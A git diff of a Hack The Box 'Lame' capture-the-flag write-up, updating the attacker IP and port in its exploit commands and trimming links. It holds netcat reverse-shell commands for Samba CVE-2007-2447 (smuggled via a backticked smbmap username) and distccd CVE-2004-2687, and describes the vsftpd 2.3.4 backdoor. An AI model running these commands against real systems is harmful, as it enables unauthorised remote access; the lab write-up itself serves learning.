@@ -173,8 +173,6 @@ PORT     STATE SERVICE
 
 Base on `searchsploit`, we know the vsftpd 2.3.4 might contain a backdoor which has been created by an intruder. The backdoor payload is initiated in response to a :) character combination in the username which represents a smiley face. The code sets up a bind shell listener on port 6200.
 
-![](images/2.png)
-
 Trigger the backdoor and execute command `whoami`
 
 ``` bash
@@ -210,23 +208,23 @@ Follow step exploit for <a href='https://wiki.jacobshodd.com/writeups/hack-the-b
 Execute command with \` in the username to get reverse shell.
 
 ```bash
-smbmap -u '/=`nc -e /bin/bash 10.10.14.4 4444`' -H 10.10.10.3
+smbmap -u '/=`nc -e /bin/bash 10.10.14.3 443`' -H 10.10.10.3
 ```
 
 Using script [samba_rce_CVE-2007-2447.py](https://wiki.jacobshodd.com/writeups/hack-the-box/lame#exploitation)
 
 ``` bash
-python3 samba_rce_CVE-2007-2447.py 10.10.10.3 'nc -nv 10.10.14.5 443 -e /bin/sh'
+python3 samba_rce_CVE-2007-2447.py 10.10.10.3 'nc -nv 10.10.14.3 443 -e /bin/sh'
 ```
 
 ![](images/5.png)
 
 ### CVE-2004-2687
 
-Based on nmap results, using exploit [distccd_rce_CVE-2004-2687.py](https://gist.githubusercontent.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855/raw/48ab4eb0bd69cac67bc97fbe182e39e5ded99f9f/distccd_rce_CVE-2004-2687.py) to get reverse shell in the server.
+Based on nmap results, using exploit [distccd_rce_CVE-2004-2687.py](https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855) to get reverse shell in the server.
 
 ```bash
-python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.64 4444 -e /bin/sh"
+python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.3 443 -e /bin/sh"
 ```
 
 ![](images/4.png)
